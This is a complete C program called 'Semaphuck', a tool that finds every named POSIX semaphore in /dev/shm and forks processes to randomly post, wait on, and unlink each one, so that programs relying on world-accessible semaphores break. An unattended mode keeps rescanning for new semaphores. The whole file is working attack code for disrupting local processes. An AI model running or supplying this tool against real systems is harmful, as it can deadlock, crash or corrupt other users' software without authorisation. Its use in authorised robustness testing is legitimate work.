#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <semaphore.h>
#include <unistd.h>
#include <pthread.h>


/* - Semaphuck -
 *  Automatic breaking of programs using improper global semaphore protection
 */


/* Linked list structure to keep track of semaphores being processed */
struct sems_seen {
    char *name;
    int refs;
    struct sems_seen *next;
};


#ifndef SILENT
#define dprintf printf
#define dperror perror
#else
#define dprintf(...)
#define dperror(...)
#endif

#define SCAN_INTERVAL 5


/* Messes with a semaphore by waiting, double waiting, posting or unlinking it randomly */
void phuck(char *name)
{
    sem_t *sem = sem_open(name, 0);
    int res;

    /* For future work */
    /* dprintf("New thread (%d) - attempting to open %s\n", pthread_self(), name); */
    dprintf("New child (%d) - attempting to open %s\n", getpid(), name);

    if (sem != SEM_FAILED) {
        while (1) {
            /* The fun begins ;-) sleep for a little */
            sleep(rand() % 3);
            usleep(rand() % 1000000 + 1);

            res = sem_trywait(sem);

            if (res == -1 || !(rand() & 2)) {
                /* It could be blocking! Better to fix that */
                dprintf("Posting %s (sem_trywait == %d)\n", name, res);
                sem_post(sem);
            } else if (rand() & 2) {
                /* Maybe this will stall as it is a race condition, who cares */
                dprintf("Waiting on %s\n", name);
                sem_wait(sem);

                dprintf("Finished waiting on %s\n", name);
            }

            if (!(rand() % 10)) {
                /* We'll just kill it */
                dprintf("Killing %s!\n", name);
                sem_unlink(name);
                sem_close(sem);
                break;
            }

            dprintf("Sleeping a little\n");
        }
    } else {
        dperror("ERROR: Couldn't open semaphore");
    }

    dprintf("Finished processing %s\n", name);
}

/* Iterate over the list and remove items with a reference count of 0 */
void rm_stale_sem(struct sems_seen *seen)
{
    struct sems_seen *c = seen, *n;

    while (c->next)
    {
        if (!c->next->refs) {
            free(c->next->name);

            n = c->next->next;
            free(c->next);
            c->next = n;
        } else {
            c = c->next;
        }
    }
}

/* Iteratively reset the reference counts */
void reset_sem(struct sems_seen *seen)
{
    while (seen = seen->next)
        seen->refs = 0;
}

/* Iterative linear search linked list while updating reference count - add if doesn't exist */
struct sems_seen *find_sem(struct sems_seen *seen, char *name)
{
    struct sems_seen *c = seen, *last = c;

    while (c = c->next) {
        if (!strcmp(c->name, name)) {
            c->refs++;
            return c;
        }

        last = c;
    }

    if (last->next = malloc(sizeof(struct sems_seen))) {
        if (last->next->name = strdup(name)) {
            last->next->refs = 1;
            last->next->next = NULL;
        } else {
            free(last->next);
        }
    }
    return NULL;
}

int main(int argc, char **argv)
{
    /* Uncomment the below line if there aren't any permissive semaphores to play with */
    sem_t *p = sem_open("quack", O_CREAT, S_IRWXU);
    DIR *d;
    struct dirent *dir;
    struct timeval t;
    struct sems_seen seen = {0};
    int unattended = argc == 2 && (!strcmp(argv[1], "-u") || !strcmp(argv[1], "--unattended"));

    /* Help parameters are a placebo as any flags other than unattended trigger usage */
    if (argc >= 2 && !unattended) {
        printf("Usage: %s [-hu]\n", argv[0]);
        printf("-h, --help              This text\n");
        printf("-u, --unattended        Continuously rescan for additional semaphores\n\n");
        return 0;
    }

    /* Seed rng to assist phuck */
    gettimeofday(&t, NULL);
    srand(t.tv_sec * 1000000 + t.tv_usec / 1000 + t.tv_usec);

    do {
        dprintf("Scanning\n");

        d = opendir("/dev/shm/");
        if (!d) {
            dperror("ERROR: opendir returned null");
        }

        /* Set reference counts to 0 */
        reset_sem(&seen);

        /* Loop through all semaphores in /dev/shm */
        while ((dir = readdir(d))) {
            if (strstr(dir->d_name, "sem.")) {
                /* Semaphores that haven't been killed will have their reference count incremented */
                if (!find_sem(&seen, dir->d_name + 4)) {
                    if (!fork()) {
                        phuck(dir->d_name + 4);  /* Skip the "sem." prefix */
                        return 0;
                    }
                } else {
                    dprintf("Already processing %s\n", dir->d_name);
                }
            }
        }

        /* Semaphores that have a reference count of 0 no longer exist and are removed */
        rm_stale_sem(&seen);

        if (unattended)
            sleep(SCAN_INTERVAL);

        closedir(d);
    } while (unattended);

    return 0;
}
